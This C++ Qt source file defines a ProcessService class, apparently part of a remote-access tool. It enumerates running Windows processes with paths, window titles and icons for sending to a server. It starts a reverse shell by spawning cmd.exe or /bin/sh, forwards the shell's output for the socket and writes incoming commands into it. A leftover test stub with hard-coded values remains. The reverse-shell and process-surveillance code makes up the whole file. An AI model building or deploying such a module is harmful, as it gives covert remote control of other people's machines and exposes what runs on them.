#include <QObject>
#include <QProcess>


#ifdef Q_OS_WIN
#include "ProcessService.h"
#include <QDataStream>
#include <Windows.h>
#include <tlhelp32.h>
#include <QFileInfo>
#include <QFileIconProvider>
#include <Psapi.h>

#endif

ProcessService::ProcessService() : reverseShellActive(false)
{
}

/* static */
QString ProcessService::getProgramPath()
{
#ifdef Q_OS_WIN
	return "cmd.exe";
#else
	const QFileInfo shell("/bin/sh");
	if (!shell.exists())
	{
		const QFileInfo bash("/bin/bash");
		if (!bash.exists())
		{
			qDebug() << "shell not found, please write down the shell path before running this snippet";
			return "";
		}

		return bash.absoluteFilePath();
	}

	return shell.absoluteFilePath();
#endif
}

ProcessService::~ProcessService()
{
}
#ifdef Q_OS_WIN
BOOL CALLBACK onEnumWindowProc(HWND hwnd, LPARAM lp)
{
	Process* processModel = (Process*)lp;
	processModel->hasUi = IsWindowVisible(hwnd);

	int bufferLength = GetWindowTextLengthW(hwnd);
	wchar_t* buffer = new wchar_t[bufferLength + 1];
	GetWindowTextW(hwnd, buffer, bufferLength + 1);
	processModel->title = QString::fromStdWString(buffer);
	delete[] buffer;
	return TRUE;
}

QList<Process> ProcessService::getProcessList()
{
	QList<Process> processList;
	HANDLE handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W pe;
	pe.dwSize = sizeof(PROCESSENTRY32W); // If not set the call Process32FirstW fails
	QFileIconProvider fileIconProvider;
	if (Process32FirstW(handle, &pe))
	{
		do
		{
			Process process;
			// We cast it because there is no DataStream >> or << operators to serialize unsigned long which is the
			// data type of pe.th32ProcessID, being sizeof unsigned long = 8 bytes, we should be fine with qint64
			process.pid = qint64(pe.th32ProcessID);

			// set at least the file name, if we then have permissions to retrieve the filepath then we overwrite it
			// with file path
			process.path = QString::fromStdWString(pe.szExeFile);
			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
			if (hProcess != NULL)
			{
				// We have successfully opened the process for query
				wchar_t filePath[MAX_PATH];
				if (GetModuleFileNameExW(hProcess, NULL, filePath, MAX_PATH))
				{
					process.path = QString::fromStdWString(filePath);
					QFileInfo fileInfo(process.path);
					// For some reason QIcon does not get sent successfully to the server, QPixmap does,
					// so convert it to QPixmap and send it
					QIcon icon = fileIconProvider.icon(fileInfo);
					process.icon = icon.pixmap(icon.availableSizes().first());
				}

				CloseHandle(hProcess);
			}


			EnumWindows(onEnumWindowProc, (LPARAM)&process);
			processList.append(process);
		}
		while (Process32NextW(handle, &pe));
	}
	else
	{
		// TODO: remote this, it was only for testing
		Process process;
		// We cast it because there is no DataStream >> or << operators to serialize unsigned long which is the
		// data type of pe.th32ProcessID, being sizeof unsigned long = 8 bytes, we should be fine with qint64
		process.pid = 100;
		process.path = "C:/Windows/System32/calc.exe";
		QFileInfo fileInfo(process.path);
		QIcon icon = fileIconProvider.icon(fileInfo);
		process.icon = icon.pixmap(icon.availableSizes().first());
		if (!process.icon.save("D:/temp/input_in.png"))
		{
		}
		process.hasUi = true;
		process.title = "Random title";
		processList.append(process);
	}

	return processList;
}
#endif


void ProcessService::startReverseShell()
{
	const QString program = getProgramPath();

	if (program.isEmpty())
		return;

	// Merge StdErr with StdOut
	process.setProcessChannelMode(QProcess::MergedChannels);

	// Start Process
	process.start(program);
	// process.waitForStarted();

	reverseShellActive = true;

	// When we have something from process pipe it to socket
	connect(&process, &QProcess::readyRead, [&]()
	{
		const QByteArray processOut = process.readAll();
		emit processOutputAvailable(processOut);
	});

	connect(&process, QOverload<int, QProcess::ExitStatus>::of(&QProcess::finished),
	        [&](int exitCode, QProcess::ExitStatus exitStatus)
	        {
		        if (reverseShellActive)
		        {
			        // We were not expecting the shell to be exited so we notify the controller
			        emit reverseShellExited(exitCode, exitStatus);
		        }
	        });
}

void ProcessService::writeToProc(const QString& command)
{
	if (command.endsWith('\n'))
		process.write(command.toUtf8());
	else
		process.write((command + "\n").toUtf8());


	process.waitForBytesWritten();
}

void ProcessService::stopShell()
{
	reverseShellActive = false;
	process.write(QString("exit\n").toUtf8());
	process.waitForBytesWritten();
	process.close();
}
